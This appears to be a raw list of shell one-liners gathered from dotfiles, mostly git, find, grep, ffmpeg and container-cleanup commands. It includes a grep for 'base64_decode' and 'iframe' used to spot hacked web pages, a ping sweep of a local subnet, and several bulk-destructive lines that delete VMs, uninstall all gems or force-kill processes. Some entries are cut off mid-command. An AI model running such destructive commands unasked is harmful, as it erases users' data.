"for ref in $(git for-each-ref --sort=-committerdate --format=""%(refname)"" refs/heads/ ); do git log --author=""Kris Luminar"" -n1 $ref --pretty=format:""%Cgreen%cr%Creset %C(yellow)%d%Creset %C(bold blue)<%an>%Creset%n"" | cat ; done | awk "
"for pkg in $(yay -Qeq); do pactree $pkg --reverse; done | grep ""^[└├]"" --before-context=1 | grep ""^[a-zA-Z]"""
"for name in *; do (test -d ""$name/.git"" && (cd ""$name""; echo -n ""$name ""; git branch | grep ^\*; for src in src/*; do (cd $src; printf "" %-30s "" ""$src""; git branch | grep ^\*); done)); done"
"for mnt in `mount | grep fuse | cut -d"" "" -f3`; do fusermount -u $mnt; done"
"for m in $(bspc query -M --names); do echo ""== $m ==""; bspc query -T -m $m | jq "".desktops[] | .name, .id""; done"
"for k in `git branch|sed s/^..//`;do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" ""$k""`\\t""$k"";done|sort; echo -e `git rev-parse --abbrev-ref HEAD`"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cblue%cr%Creset"" $k|head -n 1`\\t$k;done"
"for k in `git branch | sed s/^..//`; do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cred%cr%Creset"" $k --`\\t""$k"";done | sort"
"for k in `git branch | sed s/^..//`; do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k --`\\t""$k"";done | sort"
"for k in `git branch -a | perl -pe s/^..//`; do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k -- | head -n 1`\\t$k; done"
"for k in `git branch --merged | sed s/^..//`; do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k --`\\t""$k"";done | sort"
"for k in $(find ~/.ssh/ -name *.pub); do ssh-keygen -l -f ""${k}""; done | uniq | sort -r"
"for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo ""192.168.1.$ip UP"" || : ; done"
"for ip in $(seq 1 20); do echo ""1.$ip"" && ping -c 1 -W 0.5 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo ""192.168.1.$ip UP"" || :; done"
"for iface in $(ifa | grep -o ""^en[0-9]\|^eth[0-9]""); do echo ""Local($iface) IP : $(ipconfig getifaddr $iface)""; done"
"for i in {1..7200} ; do echo ""<|......---------xX------ $i ------Xx---------......|>"" ; sleep 1 ; done"
"for i in {0..255};do printf ""%s%3d$(tput sgr0) "" ""$(tput setab $i)"" ""$i"";if (( i == 15 )) || (( i > 15 )) && (( (i-15) % 6 == 0 )); then echo;fi; done"
"for i in {0..255} ; do printf ""\x1b[48;5;%sm%3d\e[0m "" ""$i"" ""$i""; if (( i == 15 )) || (( i > 15 )) && (( (i-15) % 6 == 0 )); then printf ""\n""; fi; done"
"for i in `vboxmanage list vms | cut -d ""{"" -f 2 | cut -d ""}"" -f 1`; do vboxmanage controlvm ""$i"" poweroff; vboxmanage unregistervm ""$i"" --delete; done && rm -Rf /home/jose/VirtualBox\ VMs/*"
"for i in `vagrant global-status | grep virtualbox | awk ""{ print \$1 }""` ; do vagrant stop $i ; done"
"for i in `vagrant global-status | grep virtualbox | awk ""{ print \$1 }""` ; do vagrant reload $i ; done"
"for i in `vagrant global-status | grep virtualbox | awk ""{ print \$1 }""` ; do vagrant destroy $i ; done"
"for i in `vagrant global-status | grep docker | awk ""{ print \$1 }""` ; do vagrant destroy $i ; done"
"for i in `ps -u pi|grep chrom |sed ""s/ ?.*//""`; do kill -9 $i; done"
"for i in `git branch -l | sed ""s/^..//g"" | grep feature/` ; do git merge $i ; done"
"for i in `find ~/repos -name .git | grep -v forge | grep -v ""\.terraform"" ` ; do cd $i/../ ; pwd ; git shortlog -s -n --all --no-merges ; done"
"for i in `find ~/repos -maxdepth 3 -name .git | grep -v forge | grep -v ""\.terraform""` ; do cd $i/../ ; pwd ; git pull ; done"
"for i in `find err.txt generated.file succ.txt -maxdepth 0 -type d`; do echo -n ""$i ""; find $i -type f 2>/dev/null | wc -l; done | egrep -v "" 0$"""
"for i in \\\$(nine-manage-vhosts virtual-host list | grep -B1 \\\""===\\\"" | grep \\\""\\\\.\\\""); do nine-manage-vhosts virtual-host update \\\$i --no-notify-services; done; nine-manage-vhosts webserver reload"
"for i in \$(command pip3 list --user --not-required | command sed -n -E -e 's/^(\\S+)\\s+.*/\\1/' -e '3,\$p' | command fzf); do command pip3 uninstall -y \$i; done"
"for i in G M K; do du -hsx err.txt generated.file succ.txt | grep ""[0-9]$i\b"" | sort -nr; done"
"for i in /web/*; do (echo ""$i:""; cd $i && (b check || b)); done"
"for i in /var/lib/dkms/*/[^k]*/source; do [ -e ""$i"" ] || echo ""$i"";done"
"for i in /sys/class/hwmon/hwmon*/temp*_input; do echo ""$(<$(dirname $i)/name): $(cat ${i%_*}_label 2>/dev/null || echo $(basename ${i%_*})) $(readlink -f $i)""; done"
"for i in $(upower -e | grep mouse_hid); do upower -i ""$i"" | awk ""/model/{printf \$2\"": \""}/percentage/{print \$2}""; done"
"for i in $(locate bash | grep home/$USER | grep ""\.bash""); do echo $i; done;"
"for i in $(kubectl -n com-att-ocnp-mgmt get pods -l $GL=glusterfs -o name | cut -d""/"" -f2); do echo -n ""$i : ""; kubectl -n com-att-ocnp-mgmt exec -it $i -- gluster peer status | grep -i peers; done"
"for i in $(d ps -a | grep ""Exited "" | awk ""{ print \$1 }""); do d rm $i; done"
"for i in $(d images | grep ""<none>.*<none>"" | awk ""{print \$3}""); do d rmi $i; done"
"for i in $(aws sqs list-queues --queue-name-prefix dev-yubo | jq -r "".QueueUrls | .[]""); do echo $i; aws sqs purge-queue --queue-url $i; done"
"for gem in `gem list | cut -d "" "" -f 1`; do yes | gem uninstall $gem -a; done"
"for fname in *.jpg; do mv ""$fname"" $(echo ""$fname"" | sha1sum | cut -f1 -d"" "").jpg; done"
"for file in ./*; do [[ -f ""$file"" ]] && [[ -x ""$file"" ]] || continue; rm -vi ""$file""; done"
"for file in $(svn status | egrep ""^\?"" | awk "
"for file in $(svn status | egrep ""^\!"" | awk "
"for file in $(diff -qr ~/dotfiles ~/ | grep differ | cut -d "" "" -f 4); do fp ""$file""; echo ""$file""; done"
"for file in $(diff -qr ~/dotfiles ~/ | grep differ | cut -d "" "" -f 4); do echo ""$file""; done"
"for file in $(diff -qr ~/ ~/dotfiles | grep differ | cut -d "" "" -f 4); do fpp ""$file""; echo ""$file""; done"
"for file in $(diff -qr ~/ ~/dotfiles | grep differ | cut -d "" "" -f 4); do echo ""$file""; done"
"for f in *; do printf ""%s %s\n"" $(find ""$f"" | wc -l) ""$(echo ""$f"")""; done | gsort -h"
"for f in *; do if [[ -d ""$f"" ]] || [[ ""${f##*.}"" == ""sh"" ]]; then chmod 755 ""$f""; else chmod 644 ""$f""; fi; done"
"for f in *.zip; do dir=""$f:r""; [ -d ""$dir"" ] || unzip -d ""$dir"" ""$f""; done"
"for f in *.rar; do dir=""$f:r""; [ -d ""$dir"" ] || (mkdir ""$dir""; cd ""./$dir""; unrar x ""../$f""; cd ..); done"
"for f in *.mp4 *.flv; do out=`echo ""$f"" | sed ""s/\.mp4\|\.flv$/.m4a/""`; ffmpeg -i ""$f"" -vn -acodec copy ""$out"";done"
"for f in $(ls -1 *_FM.zip) ; do echo -n ""$f : "" ; 7z x -so $f $( unzip -l $f |grep scan_duration.txt ) |grep ""^ddc freqs are"" ; done"
"for f in $( ls -1 DAB_*.log | sort ) ; do if [ $(grep -c ""programnameHandler:"" $f) -gt 0 ]; then echo -e ""\\n***\\n*** $f\\n***\\n"" ; cat $f |grep ""programnameHandler:"" ; fi ; done"
"for f in $( ls -1 DAB_*.log | sort ) ; do if [ $(grep -c ""ensemblenameHandler:"" $f) -gt 0 ]; then echo -e ""\\n***\\n*** $f\\n***\\n"" ; cat $f |grep ""ensemblenameHandler:"" ; fi ; done"
"for each in $(find . -maxdepth 1 -type d) ; do du -hs ""$each"" | head -n1; done | sort -rh"
"for dir in *; do pushd ""$dir"" > /dev/null; [[ $(git rev-parse --abbrev-ref HEAD) = ""develop"" ]] || echo ""$dir not on develop""; popd > /dev/null; done"
"for dir in *; do pushd ""$dir"" > /dev/null; $(git -c diff.autorefreshindex=true diff --quiet) || echo ""$dir is dirty""; popd > /dev/null; done"
"for d in `find . -maxdepth 1 -type d | grep ""./"" | grep -v ""\./\.""` ; do du -hs $d; done"
"for crond in /etc/cron.d/*; do echo -e ""\033[1m${crond##*\/} (cron.d):\n\033[0m"" && cat ${crond} | grep -v HEADER && echo ""=====================""; done && for user in /var/spool/cron/crontabs/* /var/spool/cron/*; do [[ -f ${user} ]] && echo -e ""\033[1m${user##*\/}:\n\033[0m"" && crontab -u ${user##*\/} -l | grep -v HEADER && echo ""=====================""; done"
"for c in `docker ps -a | grep -v ""^CONTAINER"" | cut -d"" "" -f1`; do docker rm $c; done"
"for c in INPUT FORWARD OUTPUT INSSH; do iptables-save | grep -- ""-A $c""| cat -n; printf "
"for branch in `git branch -r | awk ""{print $1}"" | grep -v ""\->""`
"for FILE in `file err.txt generated.file succ.txt | grep ""binary property list"" | cut -d"":"" -f1`; do echo ""\n=== :: ""$FILE"" :: ===\n""; plist-xml ""`quotelines $FILE`""; done"
"for EACH in $(top -bn 1 | /bin/grep .exe | sed ""s/.*\ //gm""); do pkill -9 ""$EACH""; done"
"for CONTAINER in $(docker ps -a | tail -n +2 | cut -d"" "" -f1); do docker rm ""${CONTAINER}""; done"
"for COLLECTION in $(ls -1 *.json | sed ""s/\.json//""); do echo ""=== Importing `${COLLECTION}` into `${DB}` ...""; done; cat ""${COLLECTION}.json"" | mongoimport --db ""${DB}"" --collection ""${COLLECTION}""; done"
"flake8 `git status --porcelain | sed ""s/^...//"" | grep "".*.py""`"
"firefox \`git config -l | grep 'remote.origin.url' | sed -En \
"firefox ""$(~/bin/script/html_link_parser.sh -l ""http://todayhumor.co.kr/board/list.php?table=bestofbest"" -b ""http://todayhumor.co.kr/board/"" -s ""\""view"" -e ""/board/list.php?kind=member&mn="" -C 1 | rev | cut -d "
"findmnt -rnuc -o SOURCE,TARGET,FSTYPE,OPTIONS | sort | column -t"
"findcrlf > /tmp/crlftolf && cat /tmp/crlftolf | while read line; do CUTLINE=$(echo $line | cut -f1 -d"":"") && dos2unix $CUTLINE; done"
"find ~/scripts -type f | fzf --preview=""head {}"" --preview-window=right:70%:wrap | xargs $EDITOR"
"find ~/public_html -type f \( -name ""*.htm"" -o -name ""*.html"" -o -name ""*.php"" \) -print0 | xargs -0 grep -Hl ""base64_decode"" > ~/hack_base64.txt && find ~/public_html -type f \( -name ""*.htm"" -o -name ""*.html"" -o -name ""*.php"" \) -print0 | xargs -0 grep -Hl ""iframe"" > ~/hack_iframe.txt"
"find ~/git/ml-app -iname ""*.pyc"" | xargs rm && find ~/git/ml-app -type d -iname __pycache__ | xargs rm -rf"
"find ~/git -type d -name .git | xargs -n 1 dirname | while read line; do cd $line && echo ""\e[33m$line\e[0m"" && git pull && git-init-scala; done; cd ~/git/xwing"
"find ~/Desktop/ -maxdepth 1 -type f -regex "".*\.\(png\|jpg\|jpeg\)"" -exec mv {} /media/davide/SAMSUNG/SW/AlgSoft\ Resizer\ 4.21/P \;"
"find ~/.password-store -name \*.gpg | sed -e ""s,$HOME/.password-store,,g"" -e ""s/.gpg$//"" | grep -i"
"find ~/ -name .git -type d | sed 's,/*[^/]\+/*$,,' | xargs -L1 bash -c 'cd \$1 && git pull; echo -ne \ : \$1 \\\n' _"
"find ~ -name "".*"" -prune -o -print | fzf --bind ""space:execute(qlmanage -p {})"" | xargs open"
"find | sed -e ""/\.[Cc]$/p"" -e ""/\.[Hh]$/p"" -e ""/\.mip/p"" -e ""/\.Ss$/p"" -e d | xargs grep $1"
"find | grep ""\.log$"" | xargs tail -f"
"find | grep ""\.log$"" | xargs grep"
"find | egrep "".txt|.md"""
"find key.o >& ~/_ && chmod a+x ~/HW1/rooms/old-building-hallway >& ~/_ ; mv -t ~/HW1/usr/toukmond/ *[^r].o >& ~/_ && echo ""You pick up everything that you can."" || echo ""There is nothing here that you can get."" ; ig"
"find config/deploy -name ""*.rb"" | perl -nle ""print /([^\\/]+)\.rb$/;print \""-\""x10;open F, \$_;print grep /^server|rails_env/, <F>"""
"find admin/bplats store -type d \( -name plugins -or -name tmp -or -name uploadfiles -or -name tests -or -name vendor -or -name Test -or -name Vendor -or -name Plugin -or -name tmp \) -prune -o -type f \( -name ""*.sh"" -or -name ""*.php"" -or -name ""*.tpl"" -or -name ""*.js"" -or -name ""*.json"" -or -name ""*.ctp"" -or -name ""*.css"" \) -exec wc -l {} \; | awk ""{print \$2,\$1}"" | sort"
"find /var/log/httpd/ -iname ""*log"" | xargs sudo tail -f | ccze -A"
"find /usr/ports -type d -d 2|sed ""s/\/usr\/ports\///g""|grep -iE"
"find /usr/ports -name pkg-descr|while read p; do echo ---; echo $p|sed ""s/\/usr\/ports\///g;s/\/pkg-descr$//g;s/^/* /g""; cat $p; done"
"find /unenc/fradeve/sync/dev/zerzan -printf ""%T+\n"" | sort -nr | head -n 1"
"find /unenc/fradeve/sync/dev/edgar -printf ""%T+\n"" | sort -nr | head -n 1"
"find /unenc/fradeve/sync/dev/duck -printf ""%T+\n"" | sort -nr | head -n 1"
"find /tmp -maxdepth 1 -daystart -mmin +59 -type f -name ""*.jpg"" | grep ""dynamic_s3_photo*"" | xargs sudo rm"
"find /n/ironwood/y/fessler/l/tex/biblio/jour/ /n/ironwood/y/fessler/l/tex/biblio/b2 -type f -not -regex '.*\.swp' -not -regex '.*\.tex' | /n/ironwood/y/fessler/l/src/script/bib/b,grep \!* | more"
"find /n/ironwood/y/fessler/l/tex/biblio/b2 $FINDARG | /n/ironwood/y/fessler/l/src/script/bib/b,grep \!* | more"
"find /home/cada/Dropbox/data/wallpapers -name ""*"" | python -c ""import sys;import random; print(random.choice(sys.stdin.readlines()).rstrip())"" | xargs -I{} convert {} /tmp/wallpaper.png; i3lock -t -i /tmp/wallpaper.png"
"find /etc /var /boot -regex "".*pac\(new\|save\|orig\)"" -print"
"find /etc -regextype posix-extended -regex "".+\.pac(new|save|orig)"" 2> /dev/null"
"find /Applications ~/Applications -type d -iregex "".*.app$"" -prune | fzf | sed "
"find / -type f -mtime 1 -printf ""%Tm:%Td %TI:%TM %Tp %p%f\\n"" | sort | grep --color ""\s\s.*"""
"find / -regextype posix-extended -regex "".+\.pac(new|save|orig)"" 2> /dev/null"
"find .n >& ~/_ && echo ""You do not have the key."" || echo ""You cannot go that way."" ; ig"
"find ./node -name ""*.js"" -not -path ""./node/node_modules/*"" -exec jsctags {} -f \; | sed ""/^&/d"" | sort > tags"
"find ./environments/developer/deployment/system/ -type d -name ""log"" -exec dirname {} \; | sed ""s:.*/::"" | sort"
"find ./config/ -name '*.example'|xargs basename -s .example | xargs -I % cp -i config/%{.example,}"
"find ./err.txt ./generated.file ./succ.txt -name ""*~"" | xargs rm -rfv; find ./err.txt ./generated.file ./succ.txt -name ""\#*"" | xargs rm -rfv"
"find ./ | grep -v ""storage"" |xargs grep -n --color=always"
"find ./ | grep -v ""storage"" |xargs grep -n --color=always -dskip"
"find ./ | grep -E ""*.swp"" | xargs rm -f"
"find ./ | grep ""py[co]$"" | xargs rm -fv"
"find ./ | grep "".DS_Store"" | xargs rm -fv"
"find ./ -type f -not -wholename \*svn\* -not -wholename \*git\*|sed ""s/\(\s\)/\\\\\1/g""|xargs grep"
"find ./ -type f ""("" -iname \*.pl -or -iname \*.pm -or -iname \*.cgi "")"" -not -wholename \*svn\* -not -wholename \*git\*|sed ""s/\(\s\)/\\\\\1/g""|xargs grep"
"find ./ -type f ""("" -iname \*.html -or -iname \*.js -or -iname \*.json "")"" -not -wholename \*svn\* -not -wholename \*git\*|sed ""s/\(\s\)/\\\\\1/g""|xargs grep"
"find ./ -type d -print | sed -e ""s;[^/]*/; /;g;s;/ ; ;g;s;^ /$;.;;s; /;|-- ;g"""
"find ./ -name ""*.c"" -o -name ""*.hpp"" -o -name ""*.h"" -o -name ""*.cpp"" -o -name ""*.java"" -type f | xargs cat | wc -l"
"find ./ -name ""*.apk"" | peco | xargs adb-peco install -r"
"find ./ -name ""*.apk"" | peco | xargs adb install -r"
"find ./ -maxdepth 1 -type d | while read -r dir; do printf ""%s:\t"" ""$dir""; find ""$dir"" | wc -l; done"
"find . | sed -e ""s/[^-][^\/]*\//--/g;s/--/ |-/"""
"find . | perl -ne 'chomp; $a = (stat $_)[2] & 07777; $a = ($a & 07707) | (($a >> 3) & 070); chmod($a, $_)'"
"find . | grep -i ""$(configurator -g gameName)[a-z\/-]*forcebuild.txt"" | while read -r line; do echo `date +%s` > ""$line"" ; done"
"find . | grep -e ""\.c$"" -e ""\.h$"" -e ""\.sh$"" | grep -v "
"find . | grep -E ""(.DS_Store)"" | xargs rm"
"find . | grep ""\.DS_Store$"" | xargs -n1 rm"
"find . | grep ""\..*\..*\..*sw.$"" | xargs rm"
"find . | egrep \""grepdocs\"" | xargs grep -n --color=auto"
"find . | egrep \""${grepall}\"" | xargs grep -n --color=auto"
"find . | egrep ""\.rej|\.orig"""
"find . \( -path \*/.git -o -path \*/node_modules \) -prune -o -type f -printf ""%TY-%Tm-%Td %TT %p\n"" | sort -r | less"
"find . -user root -type f -mmin -100 | tr ""\n"" "" "" | xargs -r chown edgar:edgar"
"find . -type f | xargs p4 files 2>&1 | perl -ne ""/(\\S+) - no such file/ && print qq(\$1\\n)""'"
"find . -type f | perl -ne ""print \$1 if m/\.([^.\/]+)$/"" | sort -u"
"find . -type f | perl -ne ""print $1 if m/(\\.[^.\\/]+)$/\"" | sort -u"
"find . -type f | grep -v ""\/\.git\/"" | xargs"
"find . -type f | grep -i ""\.git"" | xargs rm"
"find . -type f | egrep ""\.*(cc|h)$"""
"find . -type f \( -name ""*.c*"" -o -name ""*.h"" -o -name ""*.py"" -o -name ""*.sh"" -o -name ""*.m"" -o -name ""*.swift"" -o -name ""*.java"" \) -print | xargs cat | wc -l"
"find . -type f -size +5M -exec ls -hlog {} \; | sed -r -e ""s/^(\S+\s+)(\S+\s+)(\S+\s+)(\S+\s+)(\S+\s+)(\S+\s+)/\3/g"" | sort -hr"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 50000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 5000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 30000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 3000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 100000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 10000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | tail -n 1000"
"find . -type f -printf ""%T@ %T+ %p\n"" | sort -n | less"
"find . -type f -printf ""%C+ %p\n"" | sort -rn | head -n 10"
"find . -type f -printf ""%-.22T+ %M %n %-8u %-8g %8s %Tx %.8TX %p\n"" | sort | cut -f 2- -d "" """
"find . -type f -print0 | xargs -0 md5sum | tee ""${PWD/*\//}.md5"""
"find . -type f -print0 | xargs -0 ls -l | sort -k5,5rn"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(lua)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(go)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -print0 | grep --color=no -zaiE ""(\.proto$)"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.xml"" | grep -v target | grep -i "
"find . -type f -name ""*.webm"" -print0 | perl -pe ""s/\.webm\0/\0/g"" | xargs -0 -I% ffmpeg -i %.webm %.mp3"
"find . -type f -name ""*.py"" | grep -v test | grep -v env"
"find . -type f -name ""*.properties"" | grep -v target | grep -i "
"find . -type f -name ""*.pp"" -exec puppet parser validate {} + && puppet-lint --fail-on-warnings modules || figlet FAIL"
"find . -type f -name ""*.mp4"" -print0 | perl -pe ""s/\.mp4\0/\0/g"" | xargs -0 -I% ffmpeg -i %.mp4 %.mp3"
"find . -type f -name ""*.mkv"" -print0 | perl -pe ""s/\.mkv\0/\0/g"" | xargs -0 -I% ffmpeg -i %.mkv %.mp3"
"find . -type f -name ""*.m4a"" | parallel ffmpeg -i {} {.}.flac && find . -type f -name ""*.m4a"" | parallel rm {}"
"find . -type f -name ""*.json"" | grep -v target | grep -i "
"find . -type f -name ""*.js"" | grep -v node_modules | grep -v test"
"find . -type f -name ""*.go"" | grep -v .gen | grep -v vendor"
"find . -type f -name ""*.ape"" | parallel ffmpeg -i {} {.}.flac && find . -type f -name ""*.ape"" | parallel rm {}"
"find . -type f -iregex "".*\.js$"" -not -path ""./node_modules/*"" -exec jsctags {} -f \; | sed ""/^$/d"" | sort > tags"
"find . -type f -iregex "".*\.js$"" -exec jsctags {} -f \; | sed ""/^$/d"" | sort > tags"
"find . -type f -iname ""*.proto"" | grep -v ""/builds/"" | etags -"
"find . -type f -exec stat \{\} --printf=""%y\n"" \; |    10:11:34 sort -n -r | head -n 1"
"find . -type f -exec ls -lha {} \; | sort --stable --parallel=2 -t"" "" -k5rh | head -5"
"find . -type f -and \( -name ""*.sw[p|a|o]"" -or -name ""*~"" \) -printf ""\033[32m[-]\033[00m In directory \033[33m%-20h\033[0m delete file \033[31m%f\033[0m\n"" -exec rm {} \;"
"find . -type d | grep ""\.ipynb_checkpoints/\?"" | xargs -n1 rm -rf"
"find . -type d \( -iregex "".*git"" -o -iregex "".*svn"" \) -prune -o -type f -exec du -Sh {} + | sort -rh | head -n 10"
"find . -type d -name "".git"" | xargs dirname | xargs -I% bash -c ""(echo % ; cd % ; git status -sb ; echo)"""
"find . -type d -name "".git"" | while read dir ; do sh -c ""cd $dir/../ && git status -s | grep
"find . -printf ""%s %p\n""|sort -nr|head"
"find . -printf ""%s %p\n""| sort -nr | head"
"find . -print | grep -v ""\.git"" | less"
"find . -print -type f 2>/dev/null | grep -v ""\.svn/"" | xargs grep -insI "
"find . -path node_modules -prune -o -not -type d -exec file ""{}"" "";"" | grep -E ""BOM|CRLF"""
"find . -path ""*CVS"" -prune -o -path "".svn"" -prune -o -path ""*.hg"" -prune -o -name ""*.[c|C|h]*"" -a -type f -a -not -name ""*~"""
"find . -not -type d -printf ""%T+ %p\n"" | sort -n | tail -1"
"find . -not -path ""*/\.*"" -type f -exec dirname {} \; | sort | uniq -c"
"find . -not -name ""*.svn*"" -regex "".*\.[ch]\(c\|pp\)?"" | xargs grep --color=auto"
"find . -name \""*.doc\"" | grep -v datalogging | xargs grp"
"find . -name Enumerations.java | xargs grep ""public enum ManagedObjectType"" -A 77 | grep -i"
"find . -name .snapshot -prune -o -type f -name ""*~*"" -print | xargs rm -f && find . -name .snapshot -prune -o -type f -name "".*~*"" -print | xargs rm -f "
"find . -name .git -type d | sed 's,/*[^/]\+/*$,,' | xargs -L1 bash -c 'cd \$1 && git pull; echo -ne \ : \$1 \\\n' _"
"find . -name *.iml -o -name .idea -o -name target | while read i; do echo ""delete $i""; rm $i; done; find . -name *.iml -o -name .idea -o -name target | while read i; do echo ""delete $i""; rm $i; done;"
"find . -name ""iHD_drv_video.so"" | grep -i mediasdk | sudo xargs -i cp {} /opt/intel/mediasdk/lib64"
"find . -name ""__pycache__"" | xargs -L1 rm -rf && find . -name ""*.pyc"" | xargs -L1 rm -rf"
"find . -name "".git"" -type d | sed ""s/\/.git//"" | xargs -P10 -I{} git -C {} status \"
"find . -name "".git"" -type d | sed ""s/\/.git//"" | xargs -P10 -I{} git -C {} pull"
"find . -name "".git"" -type d | sed ""s/\/.git//"" | xargs -P10 -I{} git -C {} pull --rebase"
"find . -name "".git"" -type d | sed ""s/\/.git//"" | xargs -P10 -I{} git -C {} fetch origin/master"
"find . -name "".DS_Store"" | xargs rm && find . -name ""._.DS_Store"" | xargs rm"
"find . -name ""*~"" | xargs sudo rm -v; find . -name ""*#"" | xargs sudo rm -v;"
"find . -name ""*~"" | xargs rm -v; find . -name ""*#"" | xargs rm -v;"
"find . -name ""*parquet"" | xargs -I {} sh -c ""echo {}; parquet --format json {} | jq""
"find . -name ""*m4a"" | sed -e ""s/.m4a$//"" | xargs -I % ffmpeg -i ""%.m4a"" -acodec libmp3lame -ab 320k ""%.mp3"""
"find . -name ""*\.root"" -ls | sort -nk 7 | while read a b c d e f size fname; do for unit in b k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"find . -name ""*.swp"" | xargs rm && find . -name ""*\~"" | xargs rm"
"find . -name ""*.rb"" -print | xargs wc -l | tail -n 1"
"find . -name ""*.rb"" -exec ruby -wc {} \; 2>&1 | grep -v ""Syntax OK\|: warning:"""
"find . -name ""*.php"" -print0 | xargs -0 -n1 -P8 php -l | grep -v ""No syntax errors detected"""
"find . -name ""*.m"" -or -name ""*.mm"" -or -name ""*.h"" |xargs grep -v ""^$""|wc -l"
"find . -name ""*.js"" -print0 | xargs -0 jslint | more"
"find . -name ""*.java"" -o -name ""*.js"" -o -name ""*.css"" -o -name ""*.jsp"" -o -name ""*.xml""|xargs cat | wc -l"
"find . -name ""*.html"" -or -name ""*.html.eex"" -or -name ""*.vue"" |grep -v node_modules|xargs grep -nE"
"find . -name ""*.h"" |xargs | xjobs -v 0 -j 11 grep"
"find . -name ""*.h"" -or -name ""*.cpp"" -or -name ""*.cc"" -or -name ""*.hpp"" -or -name ""*.c"" | xargs cpplint 2>&1 | ag -v ""Ignor"""
"find . -name ""*.cc"" -or -name ""*.c"" -or -name ""*.h"" -or -name ""*.cpp"" | xargs cat | wc -l"
"find . -name ""*.c"" |xargs | xjobs -v 0 -j 11 grep"
"find . -name ""*.[c|h]"" | xargs egrep -nw $1"
"find . -name ""*.[c|h]"" -o -name ""*.cpp""|xargs grep -Hn $@"
"find . -name ""*.[ch]"" -print | etags - && find . -name ""*.lua"" -print | etags -a -"
"find . -name ""*.MOV"" | sed -e ""s/\.MOV/.JPG/"" | xargs -I{} rm ""{}"""
"find . -name ""*.*~"" | xargs rm && find . -name ""*.swp"" | xargs rm"
"find . -name ""*"" | grep -v node_modules | xargs csf"
"find . -name ""*"" -type f | xargs grep -o ""\w\+[.]c"" | grep -o ""\w\+[.]c[:]\w\+[.]c"""
"find . -maxdepth 3 -name "".gitfetch"" | sed -e ""s/.gitfetch$//"" | xargs gitfetcher"
"find . -maxdepth 2 -name "".git"" -type d | sed ""s/\/.git//"" | xargs -P10 -I{} git -C {} pull"
"find . -maxdepth 1 -mindepth 1 -type d | grep -v ""^\./\."" | xargs -L1 -I% bash -c ""cd %; [[ ! -z \$(git rev-list master ^origin/master) ]] && echo %"""
"find . -iregex "".+\.\(c\|h\)$"" -type f -print0 | xargs -0 uncrustify -c ~/.uncrustify4c.cfg --no-backup"
"find . -iregex "".*\.\(#.*\|orig\|bak\)$"" -exec rm -f {} +"
"find . -ipath ""*.git"" -prune -o -print| sed -e ""s/[^-][^\/]*\// |/g"""
"find . -iname ""*.py"" | xargs grep -ir def | grep -ir "" -> """
"find . -iname ""*.mp3"" | while read song; do mpg321 ${song} -w - | oggenc -q 9 -o ${song%.mp3}.ogg -; done"
"find -type f | while read f; do echo ""rm $f""; rm ""$f""; sleep 0.1; done; find -type d | while read f; do echo ""rmdir $f""; rmdir ""$f""; sleep 0.1; done;"
"find -type f -name ""*.py"" -print0 |xargs -0 grep -anvE ""^\s*def\s+"" |grep -0 --color=$COLOR_FLAG"
"find -type f -name ""*.py"" -print0 |xargs -0 grep -anE ""^\s*def\s+"" |grep -0 --color=$COLOR_FLAG"
"find -type f -name ""*.py"" -print0 |xargs -0 grep -anE ""^\s*class\s+"" |grep -0 --color=$COLOR_FLAG"
"find -type f -name ""*.[c|h]"" | xargs grep "
"find -name ""*~"" | xargs rm -f && find -name ""*.o"" | xargs rm -f"
"find -name ""*.mp3"" -exec mp3info {} -p ""%F: %r kbps\n"" \; | sort | sed ""/96 kbps/d"""
"find -name ""*.apk"" | peco | xargs adb install -r"
"find -name ""*.apk"" | head -1 | xargs adb install -r "
"find -name ""*.[c|h]"" -o -name ""*.cpp"" -o -name ""*.java"" | xargs grep --color -Hn"
"find -maxdepth 2 -type f -mtime -1 -printf ""%T@-%Tk:%TM - %f\n"" | sort -rn | cut -d- -f2-"
"find -maxdepth 1 -type f -mtime -1 -printf ""%T@-%Tk:%TM - %f\n"" | sort -rn | cut -d- -f2-"
"find -maxdepth 1 -type f -mtime -1 -printf ""%T@-%Tk:%TM - %f\n | sort -rn | cut -d- -f2-"
"find -maxdepth 1 -type d | while read -r dir; do printf ""%s:\t"" ""$dir; find ""$dir"" -type f | wc -l; done"
"find -maxdepth 1 -exec du -hsx ""{}"" \; | sort -rh | head -11"
"find -iname ""*.swp"" -print -delete | sed -e ""s/\/\./\//"" -e ""s/\.swp//"" | xargs vim -p "
"find -iname ""*.java"" | xargs grep ""@$1"" | sed ""s/@$1\\(.*\\)/\\1/g"""
"find -E ~ -type f -and -regex "".*~$|.*-ck.js|.*.tmp"" -exec rm {} \;"
"find -E . -iregex "".*\.(mp4|m4v|mov)"" -exec ffmpeg -i {} -vcodec libx264 -crf 30 outputvid.mp4 \; -exec mv outputvid.mp4 {} \;"
"find ${*-.} -type f | xargs file | awk -F, "
"find $SMO_SEARCH_PATH -type f -exec grep ^ {} \; |sed -e ""s;^$SMO_SEARCH_PATH;;"" -e ""s;\.txt:;:;"" |grep "
"find $PWD -name ""*.[c|h]"" | cscope -bkqvR -i -"
"find $HOME/Sync/var/aphrodite-motion -name ""*$(date +%Y%m%d)*"" | sort | xargs imv && delshots"
